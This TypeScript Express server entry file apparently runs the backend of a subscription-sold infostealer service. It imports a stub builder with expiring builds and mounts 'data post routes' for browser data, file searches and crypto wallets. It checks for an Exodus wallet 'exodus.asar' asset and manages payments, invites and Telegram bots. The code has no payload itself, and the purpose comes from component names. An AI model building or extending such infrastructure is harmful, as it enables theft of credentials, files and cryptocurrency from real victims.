import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import session from 'express-session';
import { initializeDatabase } from './db/connection';
import { Logger } from './utils/logger';
import { StubBuilderService } from './services/stubBuilder/stubBuilderService';
import { StubBuildService } from './services/stubBuildService';
import { TelegramLinkService } from './services/telegram/linkService';
import { TelegramResetService } from './services/telegram/resetService';
import { SubscriptionCodesCleanupService } from './services/subscriptionCodesCleanupService';
import { startResetBot } from './services/telegram/resetWorker';
import { db } from './db/connection';
import { sql, eq } from 'drizzle-orm';
import { SubscriptionService } from './services/subscriptionService';
import { PaymentService } from './services/paymentService';
import helmet from 'helmet';

// Routes
import authRoutes from './routes/auth';
import dashboardRoutes from './routes/dashboard';
import AdminRoutes from './routes/admin';
import subscriptionRoutes from './routes/subscriptionApi';
import paymentRoutes from './routes/payment';
import adminInvitesRoutes from './routes/adminInvites';
import BrowserRoutes from './routes/browser';
import FilesearchRoutes from './routes/filesearch';
import WalletsRoutes from './routes/wallets';
import subscriptionsRoutes from './routes/subscriptionsPage';
import subscriptionCodesRoutes from './routes/subscriptionCodes';
import builderRoutes from './routes/builder';
import asarRoutes from './routes/asar';
import searchRoutes from './routes/search';
import { csrfProtection } from './middleware/csrf';
import cookieParser from 'cookie-parser';
import connectPgSimple from 'connect-pg-simple';

const PgSessionStore = connectPgSimple(session);

// Load environment variables
dotenv.config();

const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(cookieParser());

// Trust proxy (needed for secure cookies behind reverse proxy like nginx)
if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', 1);
}

// Session configuration with hardened cookie
const sessionSecure = process.env.NODE_ENV === 'production';
app.use(
  session({
    store: new PgSessionStore({
      conObject: { connectionString: process.env.DATABASE_URL },
      tableName: 'session',
      createTableIfMissing: true,
      pruneSessionInterval: 60 * 15, // prune expired rows every 15 minutes
    }),
    secret: process.env.SESSION_SECRET || 'your-secret-key-change-this', // change this in prod
    resave: false,
    saveUninitialized: false,
    rolling: true, // refresh expiration on activity
    cookie: {
      secure: sessionSecure,
      httpOnly: true,
      // During development the frontend runs on a different port (Vite), which browsers treat as a different origin.
      // Use 'lax' in non-production to allow cookies to be sent with proxied requests from the dev server.
      sameSite: sessionSecure ? 'strict' : 'lax',
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
    },
  }),
);

app.use('/uploads', express.static(path.join(__dirname, '../uploads')));

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"], // For your CSS
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", 'data:', 'https:'],
      },
    },
  }),
);

// CSRF protection (after session established)
app.use(csrfProtection);

// Server-side routing guard for HTML/SPA navigation
// - Unauthenticated users may only access /auth (and API/static assets).
// - Authenticated users who hit /auth are redirected based on role/subscription.
app.use(async (req: any, res, next) => {
  try {
    const p = req.path || req.url || '';

    // Allow obvious API and static prefixes through
    const allowedPrefixes = [
      '/api',
      '/admin/api', // Allow admin API routes
      // Allow specific auth API endpoints and static subpaths through
      '/auth/me',
      '/auth/login',
      '/auth/register',
      '/auth/logout',
      '/auth/csrf',
      '/auth/invites',
      '/auth/telegram',
      '/auth/link-telegram',
      '/auth/password',
      '/auth/totp',
      '/js',
      '/sounds',
      '/uploads',
      '/payment',
      '/api/',
      '/uploads/',
      '/favicon.ico',
      '/robots.txt',
      '/__vite', // Vite HMR
      '/@vite',
      '/@vite/client',
      '/@react-refresh',
      '/@react-refresh',
      '/sockjs-node',
    ];

    const startsWithAllowed = allowedPrefixes.some((pref) => p === pref || p.startsWith(pref));

    // Allow requests for assets (files with extensions) and websocket/hmr paths
    const looksLikeAsset = /\.[a-zA-Z0-9]{1,6}$/.test(p);

    // Only enforce for navigation-like GET requests
    if (req.method !== 'GET' || startsWithAllowed || looksLikeAsset) {
      return next();
    }

    const isAuthenticated = !!(req.session && req.session.userId);

    // If not authenticated:
    // - allow requests to the landing page (root), auth UI/API through
    // - redirect other protected navigation to /auth
    if (!isAuthenticated) {
      if (p === '/' || p === '/auth' || p === '/auth/' || p.startsWith('/auth')) {
        return next();
      }
      return res.redirect('/auth');
    }

    // If authenticated and they hit /auth, redirect according to role/subscription
    if (p === '/auth' || p === '/auth/' || p.startsWith('/auth')) {
      // Admins -> /admin
      if (req.session.isAdmin) return res.redirect('/admin');

      // Non-admin: check subscription status
      try {
        const hasSub = await SubscriptionService.hasActiveSubscription(req.session.userId);
        if (hasSub) return res.redirect('/dashboard');
        return res.redirect('/subscriptions');
      } catch (e) {
        // On error, fallback to dashboard
        return res.redirect('/dashboard');
      }
    }

    // Protect admin routes - only allow admins to access /admin
    if (p === '/admin' || p === '/admin/' || p.startsWith('/admin')) {
      if (!req.session.isAdmin) {
        // Non-admin users trying to access admin routes get redirected to dashboard
        return res.redirect('/dashboard');
      }
    }

    // Otherwise allow request to proceed (user is authenticated and not hitting /auth)
    return next();
  } catch (e) {
    return next();
  }
});

// Debug: Log uploads directory contents
const uploadsDir = path.join(__dirname, '../uploads');
if (require('fs').existsSync(uploadsDir)) {
  const contents = require('fs').readdirSync(uploadsDir);

  const clientsDir = path.join(uploadsDir, 'clients');
  if (require('fs').existsSync(clientsDir)) {
    const clientContents = require('fs').readdirSync(clientsDir);
  }
}

// Custom middleware to serve static assets but block HTML files for protected routes
function protectedStatic(staticPath: string) {
  const staticMiddleware = express.static(staticPath);

  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    // Block direct access to HTML files
    if (req.path.endsWith('.html') || req.path.endsWith('/') || req.path === '') {
      return next(); // Let route handlers deal with HTML files
    }

    // Allow other static assets (CSS, JS, images, etc.)
    return staticMiddleware(req, res, next);
  };
}

const exodusAsarPath = path.join(__dirname, '../assets/exodus.asar');
if (!require('fs').existsSync(exodusAsarPath)) {
  Logger.warn('exodus.asar not found', { filePath: exodusAsarPath });
}

// Serve static files (only for public assets)
// The frontend is being migrated to a separate React app (web/).
// Do not serve the old static HTML pages from `public/` anymore — the React frontend will handle routes.
// Static asset hosting (production) should point to the built frontend (e.g. `web/dist`) when deployed.

// NOTE: If you still need to expose legacy static assets during migration, add explicit static mounts
// for the required folders (for example: app.use('/sounds', express.static(...))).
// Serve only non-HTML static assets needed by the migrating frontend
app.use('/js', express.static(path.join(__dirname, '../public/js')));
app.use('/sounds', express.static(path.join(__dirname, '../public/sounds')));

// Routes
app.use('/auth', authRoutes);
app.use('/dashboard', dashboardRoutes);
app.use('/admin', AdminRoutes);
app.use('/subscriptions', subscriptionsRoutes);
app.use('/subscription', subscriptionRoutes);
app.use('/subscription-codes', subscriptionCodesRoutes);
app.use('/payment', paymentRoutes);
app.use('/admin/invites', adminInvitesRoutes);

// data post routes
app.use('/api/browser', BrowserRoutes);
app.use('/api/filesearch', FilesearchRoutes);
app.use('/api/wallets', WalletsRoutes);
app.use('/api/asar', asarRoutes);
app.use('/api/search', searchRoutes);
app.use('/builder', builderRoutes);

// Error handler
app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
  Logger.error('Unhandled application error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
  });
  res.status(500).json({ error: 'Internal server error' });
});

// Initialize database and services
initializeDatabase()
  .then(({ healthy, report }) => {
    if (healthy) {
      Logger.info('Database is healthy');
    } else {
      Logger.warn('Database health issues detected', report);
    }
    return StubBuilderService.initialize();
  })
  .then(({ healthy, report }) => {
    if (healthy) {
      Logger.info('Builder service is healthy');
    } else {
      Logger.warn('Builder service health issues detected', report);
    }

    // Start cleanup jobs for stub builds
    setInterval(
      async () => {
        try {
          await StubBuildService.cleanupExpiredBuilds();
          await StubBuildService.deleteOldBuilds();
          await TelegramLinkService.cleanupExpiredCodes();
          const expiredCount = await PaymentService.expireOverduePending();
          if (expiredCount > 0) {
            Logger.info('Expired pending payments', { count: expiredCount });
          }

          // Run manual subscription codes cleanup (redundant with cron job but ensures consistency)
          await SubscriptionCodesCleanupService.runCleanup();
        } catch (error) {
          Logger.error('Failed to run periodic cleanup', {
            error: error instanceof Error ? error.message : String(error),
          });
        }
      },
      15 * 60 * 1000,
    ); // Run every 15 minutes

    // Start subscription codes cleanup cron job
    SubscriptionCodesCleanupService.startCleanupJob();
    Logger.info('Subscription codes cleanup service started');

    // Attempt auto-start of password reset bot if previously running
    try {
      (async () => {
        const cfg = await TelegramResetService.getConfig();
        if (cfg.enabled && cfg.bot_token) {
          // Use Drizzle ORM to check if bot should run
          const { telegramResetRuntime } = await import('./db/schema/other');
          const runtimeConfig = await db
            .select({ shouldRun: telegramResetRuntime.shouldRun })
            .from(telegramResetRuntime)
            .where(eq(telegramResetRuntime.id, 1))
            .limit(1);

          const shouldRun = runtimeConfig[0]?.shouldRun || false;
          if (shouldRun) {
            await startResetBot();
            Logger.info('Telegram reset bot started');
          }
        }
      })();
    } catch (e: any) {
      Logger.warn('Failed to auto-start reset bot', { error: e.message });
    }
  })
  .catch((error) => {
    console.error('❌ CRITICAL ERROR: Failed to initialize application');
    console.error('Error details:', error.message);
    console.error('Stack trace:', error.stack);
    Logger.error('Initialization failed', {
      error: error.message,
      stack: error.stack,
    });

    // Exit the process with error code
    process.exit(1);
  });

// Root now gives a short informational message — frontend is served separately (e.g. Vite dev or built files).
app.get('/', (_req, res) =>
  res.send(
    'Frontend is now a separate React app. Run the frontend dev server (web/) or serve the built files.',
  ),
);

export default app;
